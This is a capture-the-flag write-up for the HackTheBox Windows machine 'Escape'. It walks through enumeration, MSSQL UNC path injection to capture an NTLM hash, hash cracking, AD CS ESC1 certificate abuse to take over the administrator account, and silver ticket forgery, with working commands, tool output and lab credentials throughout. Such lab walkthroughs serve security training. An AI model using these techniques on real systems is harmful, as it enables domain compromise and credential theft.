# Escape

## Overview

A Windows machine created by [Geiseric](https://app.hackthebox.com/users/184611) features techniques including:

* Active Directory
* MSSQL Server UNC Path Injection
* Credentials Harvest
* Misconfigured Certificate Templates
* Silver Ticket Attack

## Reconnaissance

### Services Discovery

The port scanning result suggests that the target is a _domain controller_ and we got an MSSQL server running on it.

Also, we may access the target remotely later via WinRM.

```bash
$ sudo nmap -n -p- -Pn -v -sS -T4 --min-rate 1000 10.129.140.112 -oN ports.nmap
...
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
...
```

### RootDSE

We can use `ldapsearch` to get the domain name `sequel.htb`.

```bash
$ ldapsearch -H ldap://10.129.140.112 -b '' -s base -x
...
schemaNamingContext: CN=Schema,CN=Configuration,DC=sequel,DC=htb
namingContexts: DC=sequel,DC=htb
namingContexts: CN=Configuration,DC=sequel,DC=htb
...
```

We can check the target's hostname `dc.sequel.htb` with `dig`.

```bash
$ dig @<target_ip> dc.sequel.htb
...
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;dc.sequel.htb.                 IN      A

;; ANSWER SECTION:
dc.sequel.htb.          1200    IN      A       10.129.140.112
```

### SMB

It seems that the SMB null session authentication is enabled on the target.

```bash
$ smbclient -N -L \\\\10.129.140.112\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Public          Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

{% embed url="https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/ba-p/1185365" %}

We can further enumerate the share `Public` using `smbclient` and found a PDF file `SQL Server Procedures.pdf`.

```bash
$ smbclient -N \\\\10.129.140.112\\Public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1446274 blocks available
```

### SQL Server Procedures.pdf

We can learn a lot of information from the PDF file:

* Domain name `sequel.htb`.
* The target company cloned the DC mockup to a dedicated mock SQL instance for the test.
* Users can authenticate to the MSSQL server using [_Windows authentication_](https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver16) on a domain-joined machine_._
* Users on a non-domain-joined machine need to use `cmdkey` before authenticate to the MSSQL.
* We can authenticate the MSSQL server with credential `PublicUser:GuestUserCantWrite1` using SQL Server Authentication.
* Some user names and emails including Ryan, Tom, Brandon, and `brandon.brown@sequel.htb`.

### MSSQL

We can use `Impacket-mssqlclient`, which uses SQL server authentication [by default](https://github.com/fortra/impacket/blob/efc6a1c365d5e0317ebe6a432448c861616859a7/impacket/tds.py#L861), to login to the MSSQL server now.

```bash
$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@escape
```

The instance we are connecting to is `DC\SQLMOCK`.

```sql
SQL> select @@servername;

----------
DC\SQLMOCK
```

## Initial Access

### UNC Path Injection

We can use the stored procedure `xp_dirtree` to force the MSSQL server to authenticate to a SMB share we control.

{% tabs %}
{% tab title="MSSQL Server" %}
We force the MSSQL server to authenticate with our SMB server.

```sql
SQL> EXEC xp_dirtree "\\<IP>\share"
subdirectory   depth
------------   -----
```
{% endtab %}

{% tab title="SMB Server" %}
We set up a SMB sesrver using Impacket and capture the NTLM authentication messages.

```bash
$ sudo impacket-smbserver -smb2support share .
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.140.112,59181)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:ccaa3775661de1f13e604b4852ca1bb4:0101000000000000006614269f9ed901a11548007705bd96000000000100100062007a00430042004d00650050006f000300100062007a00430042004d00650050006f00020010006c0065005800420064006e0055005a00040010006c0065005800420064006e0055005a0007000800006614269f9ed90106000400020000000800300030000000000000000000000000300000ba7e14ae44c472a55ae9f2e3595120b049681885ea1cda180cb1ef3a3eef4d650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000
[*] Closing down connection (10.129.140.112,59181)
[*] Remaining connections []
```
{% endtab %}
{% endtabs %}

We can then crack it using `hashcat` with mode 5600 now and we get a credential `SQL_SVC:REGGIE1234ronnie`.

{% code overflow="wrap" %}
```bash
$ hashcat -m 5600 --force mssql/hash.txt <path_to_rockyou>
...
SQL_SVC::sequel:aaaaaaaaaaaaaaaa:ccaa3775661de1f13e604b4852ca1bb4:0101000000000000006614269f9ed901a11548007705bd96000000000100100062007a00430042004d00650050006f000300100062007a00430042004d00650050006f00020010006c0065005800420064006e0055005a00040010006c0065005800420064006e0055005a0007000800006614269f9ed90106000400020000000800300030000000000000000000000000300000ba7e14ae44c472a55ae9f2e3595120b049681885ea1cda180cb1ef3a3eef4d650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000:REGGIE1234ronnie

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SQL_SVC::sequel:aaaaaaaaaaaaaaaa:ccaa3775661de1f13e...000000
...
```
{% endcode %}

### WinRM

We can access the target using `evil-winrm` now.

```bash
$ evil-winrm -i <ip> -u sql_svc -p REGGIE1234ronnie
```

## Discovery

### LDAP Search

{% tabs %}
{% tab title="ldapsearch" %}
We can't use `ldapsearch` directly [because LDAP signing is enabled](https://github.com/fox-it/BloodHound.py/blob/760e6ee11375343da443574b1c6b2bd1509a0b8e/bloodhound/ad/authentication.py#L114).

{% code overflow="wrap" %}
```bash
$ ldapsearch -D sql_svc@sequel.htb -x -b 'dc=sequel,dc=htb' -H ldap://escape -w REGGIE1234ronnie
ldap_bind: Strong(er) authentication required (8)
        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
```
{% endcode %}
{% endtab %}

{% tab title="ldap3" %}
We can use the Python package `ldap3` to do the LDAP query as the code of `bloodhound.py`.

{% code overflow="wrap" lineNumbers="true" %}
```python
import cmd, logging
from ldap3 import Server, Connection, NTLM, ALL, SASL, KERBEROS

logger = logging.getLogger(__name__)

class ldapsearch(cmd.Cmd):
    def __init__(self, domain, user, passwd, ip):
        super().__init__()
        server = Server("ldaps://%s:3269" % ip, get_info=ALL)
        self.conn = Connection(server, user=f"{domain}\\{user}", auto_referrals=False, password=passwd, authentication=NTLM)
        logger.debug(f"bind={self.conn.bind()}")
    
    def default(self, query):
        self.conn.search(search_base='',
            search_filter = query)
        for entry in self.conn.response:
            print(entry['dn'], entry['attributes'])

l = ldapsearch('sequel.htb', 'sql_svc', 'REGGIE1234ronnie', 'escape')
l.cmdloop()
```
{% endcode %}

{% embed url="https://github.com/fox-it/BloodHound.py/blob/760e6ee11375343da443574b1c6b2bd1509a0b8e/bloodhound/ad/authentication.py#L74" %}
{% endtab %}

{% tab title="bloodhound-python" %}
We use `bloodhound.py` to collect AD information from the target.

{% code overflow="wrap" %}
```bash
$ bloodhound-python -u SQL_SVC -p REGGIE1234ronnie -d sequel.htb -v -ns <IP>
```
{% endcode %}
{% endtab %}
{% endtabs %}

### User Ryan.Cooper

We found an MSSQL log file `C:\SQLServer\Logs\ERRORLOG.BAK`.

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
...
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
...
```

We see the user `Ryan.Cooper` type his password incorrectly and we can try to login to the target using this password now.

```bash
$ evil-winrm -i escape -u ryan.cooper -p NuclearMosquito3

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

### Group&#x20;

We see that the user Ryan is a member of the group [_Certificate Service DCOM Access_](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#certificate-service-dcom-access) member of which can connect to certification authorities in the enterprise.

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
...
```

It seems that we may abuse the AD CS to achieve domain escalation.

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation" %}

## Privilege Escalation

### Certified Pre-Owned

Offensive techniques including certificate stealing, persistence, and escalation techniques are outlined in the [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf) whitepaper.

See [Certified Pre-Owned](../../windows/credential-access/certified-pre-owned.md).

### Technique ESC1

Users obtain certificates from CA through the [_certificate enrollment process_](../../windows/ad/certificate-service.md#certificate-enrollment). Some misconfiguration may result in domain escalation.

{% embed url="https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Active-Directory-Certificate-Services" %}

We can use the tool `Certify.exe` to enumerate misconfigured certificate templates.

{% embed url="https://github.com/GhostPack/Certify#compile-instructions" %}

Or, we can use the Python package `certipy` to enumerate from Linux.

{% embed url="https://github.com/ly4k/Certipy#find" %}

And, we can find a vulnerable certificate template named `UserAuthentication`:

{% code overflow="wrap" %}
```bash
$ python3 -m pip install certify-ad
$ certipy find -u 'ryan.cooper@sequel' -p 'NuclearMosquito3' -dc-ip 'escape' -vulnerable -stdout
...
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[*] Got CA configuration for 'sequel-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
...
Certificate Templates
  0 
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```
{% endcode %}

### Certificate Signing Request

We can now use `certipy` to request the certificate for the user `administrator` now.

{% code overflow="wrap" %}
```bash
$certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
{% endcode %}

### Authentication

We can request the TGT ticket for the user `administrator` using certificate now.

{% code overflow="wrap" %}
```bash
$ sudo ntpdate -u escape
$ certipy auth -pfx administrator.pfx 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
{% endcode %}

And, we can login to the target using `evil-winrm` now.

```bash
$ evil-winrm -i escape -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

## Miscellaneous

### Silver Ticket Attack

Since we got the password of the service account `SQL_SVC`, we can mint a service-granting ticket for a non-existing SPN using the password hash as in a [silver ticket attack](../../windows/credential-access/kerberos-ticket/golden-silver-ticket-attack.md).

First, we need the domain SID, in our case `S-1-5-21-4078382237-1492182817-2568127209`:

```bash
$ evil-winrm -u sql_svc -i escape -p REGGIE1234ronnie
...
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106
...
```

We also need the NT-hash `1443ec19da4dac4ffc953bca1b57b4cf`:

```python
from Cryptodome.Hash import MD4
from binascii import hexlify

password = 'REGGIE1234ronnie'
hash = MD4.new()
hash.update(password.encode('utf_16le'))
print(hexlify(hash.digest()).upper())
```

We can mint the TGS for the user `Administrator` using Impacket's `ticketer` with a non-existing SPN without touching the DC now.

{% code overflow="wrap" %}
```bash
$ impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip escape -spn MSSQL/DC.SEQUEL.HTB Administrator
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
{% endcode %}

We can now login the MSSQL service using the account `administrator` now.

```bash
$ export KRB5CCNAME=Administrator.ccache
$ impacket-mssqlclient -k dc.sequel.htb
...
SQL> select suser_name()
                       
--------------------   
sequel\Administrator 
```
